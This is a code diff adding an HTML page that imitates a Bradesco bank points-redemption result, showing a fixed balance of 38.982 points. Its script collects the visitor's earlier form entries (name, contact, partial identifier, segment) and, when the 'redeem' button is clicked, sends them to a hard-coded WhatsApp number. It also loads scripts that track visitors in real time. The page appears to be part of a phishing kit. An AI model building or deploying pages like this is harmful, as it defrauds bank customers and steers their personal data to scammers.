@@ -1,0 +1,158 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Pontos Disponíveis | Bradesco Pontos</title>
+  <style>
+    :root {
+      color-scheme: light;
+      --green: #087f5b;
+      --green-dark: #045f45;
+      --white: #ffffff;
+      --soft: rgba(255, 255, 255, 0.16);
+      font-family: Inter, "Segoe UI", Arial, Helvetica, sans-serif;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: linear-gradient(135deg, var(--green), var(--green-dark));
+      color: var(--white);
+    }
+
+    main {
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      padding: 28px;
+      text-align: center;
+    }
+
+    .result {
+      width: min(760px, 100%);
+      animation: showResult 0.7s ease both;
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 42px;
+      margin-bottom: 24px;
+      padding: 0 16px;
+      border: 1px solid rgba(255, 255, 255, 0.26);
+      border-radius: 8px;
+      background: var(--soft);
+      font-weight: 800;
+    }
+
+    h1 {
+      margin: 0 0 18px;
+      font-size: clamp(2.5rem, 8vw, 6rem);
+      line-height: 0.95;
+      letter-spacing: 0;
+    }
+
+    .points {
+      display: block;
+      margin: 0 0 20px;
+      font-size: clamp(3.4rem, 13vw, 9rem);
+      line-height: 0.95;
+      font-weight: 900;
+      letter-spacing: 0;
+    }
+
+    p {
+      max-width: 660px;
+      margin: 0 auto 30px;
+      color: rgba(255, 255, 255, 0.86);
+      font-size: 1.12rem;
+      line-height: 1.65;
+    }
+
+    .actions {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+
+    .btn {
+      min-height: 50px;
+      border-radius: 8px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 20px;
+      background: #ffffff;
+      color: var(--green-dark);
+      font-weight: 850;
+      text-decoration: none;
+      box-shadow: 0 18px 40px rgba(0, 0, 0, 0.18);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 24px 50px rgba(0, 0, 0, 0.22);
+    }
+
+    @keyframes showResult {
+      from {
+        opacity: 0;
+        transform: translateY(16px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <section class="result" aria-label="Resultado da consulta de pontos">
+      <div class="badge">Consulta concluída</div>
+      <h1>Pontos disponíveis</h1>
+      <strong class="points">38.982</strong>
+      <p>Após a confirmação no aplicativo oficial, o prazo estimado para crédito em conta é de até 24 horas.</p>
+      <div class="actions">
+        <a class="btn" id="resgatarAgora" href="#">Resgatar agora</a>
+      </div>
+    </section>
+  </main>
+  <script src="firebase-config.js"></script>
+  <script src="realtime-config.js"></script>
+  <script src="realtime-client.js"></script>
+  <script src="mojibake-fix.js"></script>
+  <script>
+    const whatsappNumber = "5511925186441"
+    const formData = JSON.parse(sessionStorage.getItem("resgateForm") || "{}");
+    const button = document.querySelector("#resgatarAgora");
+
+    button.addEventListener("click", (event) => {
+      event.preventDefault();
+
+      const message = [
+        "Olá, gostaria de prosseguir com o atendimento de resgate de pontos.",
+        `Tipo de cliente: ${formData.cliente || "não informado"}`,
+        `Nome/Razão social: ${formData.nomeCliente || "não informado"}`,
+        `Contato: ${formData.contato || "não informado"}`,
+        `Identificação parcial/protocolo: ${formData.identificadorSeguro || "não informado"}`,
+        `Perfil: ${formData.segmento || "não informado"}`,
+        `Categoria de resgate: ${formData.categoria || "não informado"}`,
+        `Pontos consultados: ${formData.pontos || "38.982"}`
+      ].join("\n");
+
+      window.location.href = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
+    });
+    BradescoRealtime.connectVisitor(document.title || 'Pagina acessada');
+  </script>
+</body>
+</html>
